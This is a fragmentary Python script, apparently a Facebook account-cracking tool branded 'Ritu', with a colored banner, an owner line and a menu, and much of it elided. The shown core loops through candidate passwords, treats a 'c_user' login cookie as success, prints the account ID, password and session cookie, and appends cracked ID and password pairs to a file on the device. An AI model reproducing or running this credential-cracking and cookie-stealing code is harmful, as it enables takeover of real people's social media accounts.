...
ha = current.day
today = date.today()
#Ritu2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mRitu')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-Ritu/1.2.0 OPN-B'
...
\033[1;92m/_/  /_/ /_/  |_|/_/ /_/ /___/ /_/ |_/   
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mRitu \033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mRitu HASAN \033[1;92m     |   
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://www.facebook.com/profile.php?id100081325148181')
       main()  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio Manik_OK.mp3")
                print('\033[1;92m[Ritu-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/Ritu-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mManik","\x1b[1;92mManik","\x1b[1;93mManik","\x1b[1;94mManik","\x1b[1;95mManik","\x1b[1;96mManik","\x1b[1;97mManik","\x1b[1;91Manik","\x1b[1;92mManik","\x1b[1;93mManik","\x1b[1;94mManik","\x1b[1;95mManik","\x1b[1;96mManik"])
